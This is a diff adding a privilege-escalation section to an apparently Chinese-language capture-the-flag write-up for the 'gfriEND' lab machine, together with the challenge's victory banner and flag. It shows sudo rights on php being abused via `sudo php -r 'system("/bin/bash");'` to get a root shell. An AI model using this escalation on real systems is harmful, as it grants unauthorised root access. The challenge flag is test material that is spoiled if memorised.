@@ -113,5 +113,41 @@ Woahhh! I like this company, I hope that here i get a better partner than bob ^_
 ### 2. 提权
 
 ```shell
+# sudo 
+sudo -l
+Matching Defaults entries for alice on gfriEND:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User alice may run the following commands on gfriEND:
+    (root) NOPASSWD: /usr/bin/php
+
+# 可以php执行，不使用root密码
+```
+
+> php提权。
+
+```shell
+# php回调bash
+sudo php -r 'system("/bin/bash");'
+
+# root权限
+cd /root
+cat flag2.txt 
+                                                                                                                                          
+  ________        __    ___________.__             ___________.__                ._.                                                      
+ /  _____/  _____/  |_  \__    ___/|  |__   ____   \_   _____/|  | _____     ____| |                                                      
+/   \  ___ /  _ \   __\   |    |   |  |  \_/ __ \   |    __)  |  | \__  \   / ___\ |                                                      
+\    \_\  (  <_> )  |     |    |   |   Y  \  ___/   |     \   |  |__/ __ \_/ /_/  >|
+ \______  /\____/|__|     |____|   |___|  /\___  >  \___  /   |____(____  /\___  /__
+        \/                              \/     \/       \/              \//_____/ \/
+
+Yeaaahhhh!! You have successfully hacked this company server! I hope you who have just learned can get new knowledge from here :) I really hope you guys give me feedback for this challenge whether you like it or not because it can be a reference for me to be even better! I hope this can continue :)
+
+Contact me if you want to contribute / give me feedback / share your writeup!
+Twitter: @makegreatagain_
+Instagram: @aldodimas73
+
+Thanks! Flag 2: gfriEND{56fbeef560930e77ff984b644fde66e7}
+
 ```
 
